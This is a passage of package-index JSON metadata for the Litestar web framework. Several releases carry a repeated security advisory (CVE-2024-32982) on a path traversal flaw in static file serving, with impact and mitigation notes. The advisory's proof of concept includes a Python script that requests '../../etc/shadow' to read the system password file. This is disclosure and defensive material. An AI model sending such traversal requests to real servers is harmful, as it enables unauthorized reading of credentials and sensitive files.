server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.4.0":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.4.0/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.4.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"662f5052e1924b938ee156f49a6ecc53f1d9cfe5890dab2b43447f33b53001d5","md5":"67faa20a0536dca860accae3ad0a4d02","sha256":"c98e21c95d8e6f4cfbd27dea45cc74923d441f1005abd292a2b92fa9069da773"},"downloads":-1,"filename":"litestar-2.4.0-py3-none-any.whl","has_sig":false,"md5_digest":"67faa20a0536dca860accae3ad0a4d02","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":483753,"upload_time":"2023-11-27T19:20:59","upload_time_iso_8601":"2023-11-27T19:20:59.996505Z","url":"https://files.pythonhosted.org/packages/66/2f/5052e1924b938ee156f49a6ecc53f1d9cfe5890dab2b43447f33b53001d5/litestar-2.4.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"a1e0e2a18b3842d0759187ddd8d8675e83e4a329d0717c4f1480660424fdbe78","md5":"f31c6bf21a9c56cc50571950ca322984","sha256":"118dafe47c0fdb6d4a20c56dcbf9e7d09a13c82772619fa19284a05ecd084de5"},"downloads":-1,"filename":"litestar-2.4.0.tar.gz","has_sig":false,"md5_digest":"f31c6bf21a9c56cc50571950ca322984","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":622502,"upload_time":"2023-11-27T19:21:02","upload_time_iso_8601":"2023-11-27T19:21:02.851462Z","url":"https://files.pythonhosted.org/packages/a1/e0/e2a18b3842d0759187ddd8d8675e83e4a329d0717c4f1480660424fdbe78/litestar-2.4.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.4.1":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.4.1/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.4.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"00722a8ca31e1ae93d97712fcaf59710a30be1d154e37ee99b590b1a0776b307","md5":"227a2ccf36cba499ade7dd073eae369c","sha256":"6bc1176f3c9c90b75ccd0121f801a7e07cf386ffb8188507eaf4e95e34741775"},"downloads":-1,"filename":"litestar-2.4.1-py3-none-any.whl","has_sig":false,"md5_digest":"227a2ccf36cba499ade7dd073eae369c","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":484037,"upload_time":"2023-11-28T10:47:31","upload_time_iso_8601":"2023-11-28T10:47:31.877230Z","url":"https://files.pythonhosted.org/packages/00/72/2a8ca31e1ae93d97712fcaf59710a30be1d154e37ee99b590b1a0776b307/litestar-2.4.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"f60453af3b837348088437bd062e29466f5ba5f50a4905cc228c11dff0548303","md5":"7d6d3af8d73c57bbe57a29e7084fee68","sha256":"273d136621cf41b04f566424b959ec602b06a0e496d24a61836c3279f10d47d3"},"downloads":-1,"filename":"litestar-2.4.1.tar.gz","has_sig":false,"md5_digest":"7d6d3af8d73c57bbe57a29e7084fee68","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":622716,"upload_time":"2023-11-28T10:47:34","upload_time_iso_8601":"2023-11-28T10:47:34.739200Z","url":"https://files.pythonhosted.org/packages/f6/04/53af3b837348088437bd062e29466f5ba5f50a4905cc228c11dff0548303/litestar-2.4.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.4.2":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.4.2/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < 